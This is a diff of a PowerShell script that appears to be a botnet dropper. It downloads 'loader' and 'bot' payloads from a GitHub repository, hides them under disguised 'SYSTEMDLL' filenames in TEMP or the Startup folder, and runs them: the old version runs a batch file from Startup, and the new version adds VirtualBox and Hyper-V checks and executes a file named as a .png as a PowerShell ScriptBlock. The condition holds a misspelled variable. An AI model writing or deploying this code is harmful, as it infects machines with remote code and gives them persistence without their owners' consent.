@@ -1,17 +1,28 @@
-$temp = $env:TEMP;
-$userprof = $env:USERPROFILE;
-$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
+$A = (Get-Process | Select-String -Pattern vboxservice).count
+If ($A -GT 0) { $Virtual = $True} Else {$Virtual = $False};
 
-$botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem'; #Always Useful
+$B = Get-WmiObject -Q “Select Model From Win32_ComputerSystem”
+If ($B.Model -eq “Virtual Machine”) {$Hyper = $True} Else {$Hyper = $False};
 
-$wc = [System.Net.WebClient]::new();
-$loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
-$wc.DownloadFile("$loader","$startUpFolder\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
+if ($virual -eq $True -And $Hyper -eq $True){
+    $temp = $env:TEMP;
+    $userprof = $env:USERPROFILE;
+    $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
 
-$bot = "https://raw.githubusercontent.com/ghostleaper/rhino/main/bot";
-$wc.DownloadFile("$bot","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log");
+    $botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem';
+
+    $wc = [System.Net.WebClient]::new();
+    $loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
+    $wc.DownloadFile("$loader","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
+
+    $bot = "https://raw.githubusercontent.com/ghostleaper/rhino/main/bot";
+    $wc.DownloadFile("$bot","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.png");
 
 
+    $AnyFile = Get-Content $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.png -Raw
 
-$cmd = (start-process $startUpFolder\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat) 
-$cmd
+        $ScriptBlock = [System.Management.Automation.ScriptBlock]::Create($AnyFile)
+
+        & $ScriptBlock
+
+}
